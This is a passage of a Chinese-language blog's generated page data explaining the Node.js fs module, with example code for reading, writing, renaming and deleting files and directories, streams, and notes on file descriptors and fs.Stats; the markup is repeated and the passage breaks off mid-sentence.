readerStream = fs.createReadStream( &apos;input.txt&apos;);</span><br><span class=\"line\">var writerStream = fs.createWriteStream( &apos;output.txt&apos;);</span><br><span class=\"line\">readerStream.pipe( writerStream );</span><br><span class=\"line\">console.log(&quot;程序执行完毕&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//13. fs.access 判断目录、文件是否存在(读写权限)</span><br><span class=\"line\">var  fs = require(&apos;fs&apos;);</span><br><span class=\"line\">fs.access(&apos;package.json&apos;,(err)=&gt;&#123;</span><br><span class=\"line\">    console.log(err ?  &apos;目录/文件不存在&apos;: &apos;文件存在,可以进行读写&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"FS-文件系统\"><a href=\"#FS-文件系统\" class=\"headerlink\" title=\"FS-文件系统\"></a><a href=\"http://nodejs.cn/api/fs.html#fs_file_system\" target=\"_blank\" rel=\"noopener\">FS-文件系统</a></h2><p>fs 模块提供了一些 API，用于以一种类似标准 POSIX 函数的方式与文件系统进行交互。</p>\n<p><strong>所有的文件系统操作都有异步和同步两种形式。</strong></p>\n<p><code>异步</code>形式的 <strong>最后一个<code>参数</code>都是完成时<code>回调函数</code></strong>。 传给回调函数的参数取决于具体方法，但<code>回调函数的第一个参数都会保留给异常</code>。 如果操作成功完成，则第一个参数会是 null 或 undefined。</p>\n<p><strong>同步操作</strong></p>\n<p>当使用<code>同步操作</code>时，任何异常都会被立即抛出，可以使用 <code>try/catch</code> 来处理异常，或让异常向上冒泡。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const fs = require(&apos;fs&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">try &#123;</span><br><span class=\"line\">  fs.unlinkSync(&apos;/tmp/hello&apos;);</span><br><span class=\"line\">  console.log(&apos;successfully deleted /tmp/hello&apos;);</span><br><span class=\"line\">&#125; catch (err) &#123;</span><br><span class=\"line\">  // handle the error</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>异步操作</strong></p>\n<p>注意，异步的方法不能保证执行顺序。 所以下面的例子可能会出错，因为 fs.stat() 操作可能在 fs.rename() 操作之前完成。</p>\n<p><strong>建议</strong></p>\n<p>在繁忙的进程中，建议使用函数的异步版本。 同步的方法会阻塞整个进程，直到完成（停止所有连接）。</p>\n<h3 id=\"文件路径\"><a href=\"#文件路径\" class=\"headerlink\" title=\"文件路径\"></a>文件路径</h3><p>大部分 <code>fs</code> 操作接受<code>字符串</code>、<code>Buffer</code>、或使用 <code>file:</code> 协议的 <code>URL</code> 对象作为文件路径。</p>\n<p><code>相对路径</code> 会相对于 <code>process.cwd()</code> 定义的当前工作目录进行处理。</p>\n<p>使用 <code>Buffer</code> 定义的路径主要用于将文件路径处理为 opaque 字节序列的特定 POSIX 操作系统。 在这种系统上，一个文件路径可能包含使用多种字符编码的子序列。 与字符串路径一样，Buffer 路径也可以是相对的或绝对的。</p>\n<p><strong>注意</strong> 在 Windows 上 Node.js 遵循 per-drive 工作目录的理念。 当使用驱动器路径不带反斜杠时可以观察到该特性。 例如，fs.readdirSync(‘c:\\‘) 可能会返回与 fs.readdirSync(‘c:’) 不同的结果。 详见 <a href=\"\">MSDN路径文档</a></p>\n<h4 id=\"支持-URL-对象\"><a href=\"#支持-URL-对象\" class=\"headerlink\" title=\"支持 URL 对象\"></a>支持 URL 对象</h4><h3 id=\"文件描述符\"><a href=\"#文件描述符\" class=\"headerlink\" title=\"文件描述符\"></a><strong>文件描述符</strong></h3><p>在 <code>POSIX</code> 系统，<code>内核</code>为<code>所有进程</code>维护着一张当前打开着的<code>文件与资源表格</code>。 每个打开的文件都会分配一个名为<code>文件描述符</code>的数值标识。</p>\n<p>在<code>系统层</code>，所有<code>文件系统操作</code>使用这些<code>文件描述符</code>来识别与追踪每个特定的文件。 </p>\n<p>Window 系统使用了一个<code>不同但概念类似</code>的机制来追踪资源。 </p>\n<p>为方便用户，<code>Node.js 抽象了不同操作系统间的差异</code>，为所有打开的文件分配了数值的文件描述符。</p>\n<p><code>fs.open()</code> 方法用于分配一个新的文件描述符。 一旦分配了，文件描述符可用于<code>读取</code>数据、<code>写入</code>数据、或<code>查看</code>文件信息。</p>\n<p><code>大多数操作系统</code>会<code>限制打开的文件描述符的数量</code>，所以当<code>操作完成时需关闭描述符</code>。 如果不这样做会导致<code>内存泄漏</code>，最终造成应用奔溃。</p>\n<h3 id=\"线程池的使用\"><a href=\"#线程池的使用\" class=\"headerlink\" title=\"线程池的使用\"></a>线程池的使用</h3><p>注意，所有文件系统 API 中，除了 <code>fs.FSWatcher()</code> 和那些显式同步的方法之外，都使用了 <code>libuv</code> 的线程池，这对于某些应用程序可能会产生出乎意料问题和负面的性能影响，详见 <a href=\"http://nodejs.cn/api/cli.html#cli_uv_threadpool_size_size\" target=\"_blank\" rel=\"noopener\"><code>UV_THREADPOOL_SIZE</code></a> 文档。</p>\n<h1 id=\"fs-FSWatcher-类\"><a href=\"#fs-FSWatcher-类\" class=\"headerlink\" title=\"fs.FSWatcher 类\"></a>fs.FSWatcher 类</h1><p>成功调用 <code>fs.watch()</code> 方法会返回一个新的 <code>fs.FSWatcher</code> 对象。</p>\n<p>所有 <code>fs.FSWatcher</code> 对象都是 <a href=\"http://nodejs.cn/api/events.html\" target=\"_blank\" rel=\"noopener\"><code>EventEmitter</code></a> 的，每当监视的文件被修改时会触发 <code>&#39;change&#39;</code> 事件。</p>\n<h2 id=\"‘change’-事件\"><a href=\"#‘change’-事件\" class=\"headerlink\" title=\"‘change’ 事件\"></a>‘change’ 事件</h2><ul>\n<li><code>eventType</code> \\<string> 发生的变化事件的类型。</string></li>\n<li><code>filename</code> \\<string> | \\<buffer> 变化的文件名（如果是相关的或有效的）。</buffer></string></li>\n</ul>\n<p>当被监视的目录或文件有变化时触发。 详见 <code>fs.watch()</code></p>\n<h2 id=\"‘close’-事件\"><a href=\"#‘close’-事件\" class=\"headerlink\" title=\"‘close’ 事件\"></a>‘close’ 事件</h2><p>当 <code>watcher</code> 停止监视文件变化时触发。 关闭的 <code>fs.FSWatcher</code> 对象在事件处理函数中不再可用。</p>\n<h2 id=\"‘error’-事件\"><a href=\"#‘error’-事件\" class=\"headerlink\" title=\"‘error’ 事件\"></a>‘error’ 事件</h2><p>当监视文件发生错误时触发。 </p>\n<p>发生错误的 <code>fs.FSWatcher</code> 对象在事件处理函数中<code>不再可用</code>。</p>\n<h2 id=\"watcher-close\"><a href=\"#watcher-close\" class=\"headerlink\" title=\"watcher.close()\"></a>watcher.close()</h2><p><code>fs.FSWatcher</code> <code>停止监视</code>文件的变化。 </p>\n<p>一旦停止，<code>fs.FSWatcher</code> 对象将<code>不再可用</code>。</p>\n<h1 id=\"fs-ReadStream-类\"><a href=\"#fs-ReadStream-类\" class=\"headerlink\" title=\"fs.ReadStream 类\"></a>fs.ReadStream 类</h1><p>成功调用 <code>fs.createReadStream()</code> 会返回一个新的 <code>fs.ReadStream</code> 对象。</p>\n<p><code>fs.ReadStream</code> 对象都是可读流。</p>\n<h2 id=\"‘close’-事件-1\"><a href=\"#‘close’-事件-1\" class=\"headerlink\" title=\"‘close’ 事件\"></a>‘close’ 事件</h2><p>当 <code>fs.ReadStream</code> 底层的文件描述符被关闭时触发。</p>\n<h2 id=\"‘open’-事件\"><a href=\"#‘open’-事件\" class=\"headerlink\" title=\"‘open’ 事件\"></a>‘open’ 事件</h2><h2 id=\"‘ready’-事件\"><a href=\"#‘ready’-事件\" class=\"headerlink\" title=\"‘ready’ 事件\"></a>‘ready’ 事件</h2><h2 id=\"readStream-bytesRead\"><a href=\"#readStream-bytesRead\" class=\"headerlink\" title=\"readStream.bytesRead\"></a>readStream.bytesRead</h2><p>已读取的字节数。</p>\n<h2 id=\"readStream-path\"><a href=\"#readStream-path\" class=\"headerlink\" title=\"readStream.path\"></a>readStream.path</h2><h1 id=\"fs-Stats-类\"><a href=\"#fs-Stats-类\" class=\"headerlink\" title=\"fs.Stats 类\"></a>fs.Stats 类</h1><p><code>fs.Stats</code> 对象提供了一个文件的信息。</p>\n<h2 id=\"stats-isBlockDevice\"><a href=\"#stats-isBlockDevice\" class=\"headerlink\" title=\"stats.isBlockDevice()\"></a>stats.isBlockDevice()</h2><p>如果 <code>fs.Stats</code> 对象表示一个块设备，则返回 true 。</p>\n<h2 id=\"stats-isCharacterDevice\"><a href=\"#stats-isCharacterDevice\" class=\"headerlink\" title=\"stats.isCharacterDevice()\"></a>stats.isCharacterDevice()</h2><p>如果 <code>fs.Stats</code> 对象表示一个字符设备，则返回 true 。</p>\n<h2 id=\"stats-isDirectory\"><a href=\"#stats-isDirectory\" class=\"headerlink\" title=\"stats.isDirectory()\"></a>stats.isDirectory()</h2><p>如果 <code>fs.Stats</code> 对象表示一个文件系统目录，则返回 true 。</p>\n<h2 id=\"stats-isFIFO\"><a href=\"#stats-isFIFO\" class=\"headerlink\" title=\"stats.isFIFO()\"></a>stats.isFIFO()</h2><p>如果 <code>fs.Stats</code> 对象表示一个<code>先进先出 (FIFO) 管道</code>，则返回 true 。</p>\n<p>FIFO( First Input First Output)简单说就是指先进先出。<a href=\"https://baike.baidu.com/item/FIFO存储器/4530258?fr=aladdin\" target=\"_blank\" rel=\"noopener\">百度百科: FIFO存储器</a></p>\n<h2 id=\"stats-isFile\"><a href=\"#stats-isFile\" class=\"headerlink\" title=\"stats.isFile()\"></a>stats.isFile()</h2><p>如果 <code>fs.Stats</code> 对象表示一个普通文件，则返回 <code>true</code> 。</p>\n<h2 id=\"stats-isSocket\"><a href=\"#stats-isSocket\" class=\"headerlink\" title=\"stats.isSocket()\"></a>stats.isSocket()</h2><p>如果 <code>fs.Stats</code> 对象表示一个 <code>socket</code>，则返回 <code>true</code> 。</p>\n<h2 id=\"stats-isSymbolicLink\"><a href=\"#stats-isSymbolicLink\" class=\"headerlink\" title=\"stats.isSymbolicLink()\"></a>stats.isSymbolicLink()</h2><p>如果 <code>fs.Stats</code> 对象表示一个符号链接，则返回 <code>true</code> 。</p>\n<p>该方法只在使用 <code>fs.lstat()</code> 时有效。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">type</th>\n<th style=\"text-align:left\">description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">stats.dev</td>\n<td style=\"text-align:left\">包含文件的设备的数值型标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.ino</td>\n<td style=\"text-align:left\">文件系统特定的文件索引节点数值。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.mode</td>\n<td style=\"text-align:left\">表示文件类型与模式的位域。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.nlink</td>\n<td style=\"text-align:left\">文件的硬链接数量。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.uid</td>\n<td style=\"text-align:left\">文件拥有者的数值型用户标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.gid</td>\n<td style=\"text-align:left\">拥有文件的群组的数值型群组标识。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">stats.rdev</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\"></td>\n</tr>\n</tbody>\n</table>\n<p>## </p>\n<p>## </p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Node-js-fs模块-文件模块-创建、删除目录-文件-读取写入文件流\"><a href=\"#Node-js-fs模块-文件模块-创建、删除目录-文件-读取写入文件流\" class=\"headerlink\" title=\"Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流\"></a><a href=\"https://blog.csdn.net/houyanhua1/article/details/79443987\" target=\"_blank\" rel=\"noopener\">Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* </span><br><span class=\"line\"> 1. fs.stat  检测是文件还是目录(目录 文件是否存在) </span><br><span class=\"line\"> 2. fs.mkdir  创建目录 （创建之前先判断是否存在） </span><br><span class=\"line\"> 3. fs.writeFile  写入文件(文件不存在就创建,但不能创建目录) </span><br><span class=\"line\"> 4. fs.appendFile 写入追加文件 </span><br><span class=\"line\"> 5. fs.readFile 读取文件 </span><br><span class=\"line\"> 6. fs.readdir 读取目录 </span><br><span class=\"line\"> 7. fs.rename 重命名 </span><br><span class=\"line\"> 8. fs.rmdir  删除目录 </span><br><span class=\"line\"> 9. fs.unlink 删除文件 </span><br><span class=\"line\"> 10. fs.createReadStream(&apos;&apos;) 从文件流中读取数据</span><br><span class=\"line\"> 11. fs.createWriteStream  写入文件流</span><br><span class=\"line\"> 12. pipe 管道流 </span><br><span class=\"line\"> 13. fs.access 判断目录、文件是否存在(读写权限)</span><br><span class=\"line\">*/</span><br><span class=\"line\"> </span><br><span class=\"line\">var fs=require(&apos;fs&apos;);   //fs是node.js的核心模块，不用下载安装，可以直接引入  </span><br><span class=\"line\"> </span><br><span class=\"line\">//1. fs.stat  检测是文件还是目录  fs.statSync()同步获取stats对象,通过返回值接收。</span><br><span class=\"line\">fs.stat(&apos;html&apos;,function(error,stats)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;文件：&apos;+stats.isFile());</span><br><span class=\"line\">    console.log(&apos;目录：&apos;+stats.isDirectory());</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//2. fs.mkdir  创建目录  </span><br><span class=\"line\">fs.mkdir(&apos;css&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;创建目录成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//3. fs.writeFile  写入文件（会覆盖之前的内容）（文件不存在就创建）  utf8参数可以省略  </span><br><span class=\"line\">fs.writeFile(&apos;123.txt&apos;,&apos;你好nodejs 覆盖&apos;,&apos;utf8&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;写入成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//4. fs.appendFile 追加文件  </span><br><span class=\"line\">fs.appendFile(&apos;123.txt&apos;,&apos;这是写入的内容\\n&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;写入成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//5.fs.readFile 读取文件  </span><br><span class=\"line\">fs.readFile(&apos;123.txt&apos;,function(error,data)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //console.log(data);  //data是读取的十六进制的数据。  也可以在参数中加入编码格式&quot;utf8&quot;来解决十六进制的问题;</span><br><span class=\"line\">    console.log(data.toString());  //读取出所有行的信息  </span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//6.fs.readdir 读取目录下第一级内容  把目录下面的文件和文件夹都获取到。  </span><br><span class=\"line\">fs.readdir(&apos;html&apos;,function(error,data)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(data);  //data是数组类型，包含文件夹以及文件的名字(只有第一级目录内容)。拿到一个文件夹下面的所有目录  </span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//7.fs.rename 重命名  1.改名  2.剪切文件(移动)  </span><br><span class=\"line\">fs.rename(&apos;html/index.html&apos;,&apos;html/news.html&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;修改名字成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//8. fs.rmdir  删除目录   rmdir 这个方法只能删除目录，不能删除文件  </span><br><span class=\"line\">fs.rmdir(&apos;abc目录&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;删除目录成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//9. fs.unlink删除文件  </span><br><span class=\"line\">fs.unlink(&apos;index.txt&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;删除文件成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//10. fs.createReadStream  从文件流中读取数据，读取的文件比较大时建议用流的方式读取，文件比较大会多次读取。  </span><br><span class=\"line\">var fileReadStream = fs.createReadStream( &apos;data1.json&apos;);</span><br><span class=\"line\">var str = &apos;&apos;;</span><br><span class=\"line\">fileReadStream.on(&apos;data&apos;, (data) =&gt; &#123;</span><br><span class=\"line\">    console.log(&quot;接收到&quot; + data.length);   //文件比较大时，会多次读取，多次执行该回调函数  </span><br><span class=\"line\">str += data;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">fileReadStream.on(&apos;end&apos;, () =&gt; &#123;</span><br><span class=\"line\">    console.log(&quot; --- 结束 ---&quot;);</span><br><span class=\"line\">console.log( str );</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">fileReadStream.on(&apos;error&apos;, (error) =&gt; &#123;</span><br><span class=\"line\">    console.log(error)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//11. fs.createWriteStream  写入文件流  </span><br><span class=\"line\">var fs = require(&quot;fs&quot;);</span><br><span class=\"line\">var data  = &quot;我是从数据库获取的数据，我要保存起来&quot;;</span><br><span class=\"line\">var writerStream = fs.createWriteStream(&apos;output.txt&apos;);</span><br><span class=\"line\">writerStream.write( data , &apos;UTF8&apos; );</span><br><span class=\"line\">writerStream.end();  //标记文件末尾  结束写入流，释放资源  </span><br><span class=\"line\">writerStream.on( &apos;finish&apos;,  function() &#123;</span><br><span class=\"line\">    console.log(&quot;写入完成。&quot;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">writerStream.on( &apos;error&apos;,  function(error)&#123;</span><br><span class=\"line\">    console.log(error.stack);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">console.log(&quot;程序执行完毕&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//12. pipe 管道流  </span><br><span class=\"line\">var fs = require(&quot;fs&quot;);</span><br><span class=\"line\">var readerStream = fs.createReadStream( &apos;input.txt&apos;);</span><br><span class=\"line\">var writerStream = fs.createWriteStream( &apos;output.txt&apos;);</span><br><span class=\"line\">readerStream.pipe( writerStream );</span><br><span class=\"line\">console.log(&quot;程序执行完毕&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//13. fs.access 判断目录、文件是否存在(读写权限)</span><br><span class=\"line\">var  fs = require(&apos;fs&apos;);</span><br><span class=\"line\">fs.access(&apos;package.json&apos;,(err)=&gt;&#123;</span><br><span class=\"line\">    console.log(err ?  &apos;目录/文件不存在&apos;: &apos;文件存在,可以进行读写&apos;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"FS-文件系统\"><a href=\"#FS-文件系统\" class=\"headerlink\" title=\"FS-文件系统\"></a><a href=\"http://nodejs.cn/api/fs.html#fs_file_system\" target=\"_blank\" rel=\"noopener\">FS-文件系统</a></h2><p>fs 模块提供了一些 API，用于以一种类似标准 POSIX 函数的方式与文件系统进行交互。</p>\n<p><strong>所有的文件系统操作都有异步和同步两种形式。</strong></p>\n<p><code>异步</code>形式的 <strong>最后一个<code>参数</code>都是完成时<code>回调函数</code></strong>。 传给回调函数的参数取决于具体方法，但<code>回调函数的第一个参数都会保留给异常</code>。 如果操作成功完成，则第一个参数会是 null 或 undefined。</p>\n<p><strong>同步操作</strong></p>\n<p>当使用<code>同步操作</code>时，任何异常都会被立即抛出，可以使用 <code>try/catch</code> 来处理异常，或让异常向上冒泡。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const fs = require(&apos;fs&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">try &#123;</span><br><span class=\"line\">  fs.unlinkSync(&apos;/tmp/hello&apos;);</span><br><span class=\"line\">  console.log(&apos;successfully deleted /tmp/hello&apos;);</span><br><span class=\"line\">&#125; catch (err) &#123;</span><br><span class=\"line\">  // handle the error</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>异步操作</strong></p>\n<p>注意，异步的方法不能保证执行顺序。 所以下面的例子可能会出错，因为 fs.stat() 操作可能在 fs.rename() 操作之前完成。</p>\n<p><strong>建议</strong></p>\n<p>在繁忙的进程中，建议使用函数的异步版本。 同步的方法会阻塞整个进程，直到完成（停止所有连接）。</p>\n<h3 id=\"文件路径\"><a href=\"#文件路径\" class=\"headerlink\" title=\"文件路径\"></a>文件路径</h3><p>大部分 <code>fs</code> 操作接受<code>字符串</code>、<code>Buffer</code>、或使用 <code>file:</code> 协议的 <code>URL</code> 对象作为文件路径。</p>\n<p><code>相对路径</code> 会相对于 <code>process.cwd()</code> 定义的当前工作目录进行处理。</p>\n<p>使用 <code>Buffer</code> 定义的路径主要用于将文件路径处理为 opaque 字节序列的特定 POSIX 操作系统。 在这种系统上，一个文件路径可能包含使用多种字符编码的子序列。 与字符串路径一样，Buffer 路径也可以是相对的或绝对的。</p>\n<p><strong>注意</strong> 在 Windows 上 Node.js 遵循 per-drive 工作目录的理念。 当使用驱动器路径不带反斜杠时可以观察到该特性。 例如，fs.readdirSync(‘c:\\‘) 可能会返回与 fs.readdirSync(‘c:’) 不同的结果。 详见 <a href=\"\">MSDN路径文档</a></p>\n<h4 id=\"支持-URL-对象\"><a href=\"#支持-URL-对象\" class=\"headerlink\" title=\"支持 URL 对象\"></a>支持 URL 对象</h4><h3 id=\"文件描述符\"><a href=\"#文件描述符\" class=\"headerlink\" title=\"文件描述符\"></a><strong>文件描述符</strong></h3><p>在 <code>POSIX</code> 系统，<code>内核</code>为<code>所有进程</code>维护着一张当前打开着的<code>文件与资源表格</code>。 每个打开的文件都会分配一个名为<code>文件描述符</code>的数值标识。</p>\n<p>在<code>系统层</code>，所有<code>文件系统操作</code>使用这些<code>文件描述符</code>来识别与追踪每个特定的文件。 </p>\n<p>Window 系统使用了一个<code>不同但概念类似</code>的机制来追踪资源。 </p>\n<p>为方便用户，<code>Node.js 抽象了不同操作系统间的差异</code>，为所有打开的文件分配了数值的文件描述符。</p>\n<p><code>fs.open()</code> 方法用于分配一个新的文件描述符。 一旦分配了，文件描述符可用于<code>读取</code>数据、<code>写入</code>数据、或<code>查看</code>文件信息。</p>\n<p><code>大多数操作系统</code>会<code>限制打开的文件描述符的数量</code>，所以当<code>操作完成时需关闭描述符</code>。 如果不这样做会导致<code>内存泄漏</code>，最终造成应用奔溃。</p>\n<h3 id=\"线程池的使用\"><a href=\"#线程池的使用\" class=\"headerlink\" title=\"线程池的使用\"></a>线程池的使用</h3><p>注意，所有文件系统 API 中，除了 <code>fs.FSWatcher()</code> 和那些显式同步的方法之外，都使用了 <code>libuv</code> 的线程池，这对于某些应用程序可能会产生出乎意料问题和负面的性能影响，详见 <a href=\"http://nodejs.cn/api/cli.html#cli_uv_threadpool_size_size\" target=\"_blank\" rel=\"noopener\"><code>UV_THREADPOOL_SIZE</code></a> 文档。</p>\n<h1 id=\"fs-FSWatcher-类\"><a href=\"#fs-FSWatcher-类\" class=\"headerlink\" title=\"fs.FSWatcher 类\"></a>fs.FSWatcher 类</h1><p>成功调用 <code>fs.watch()</code> 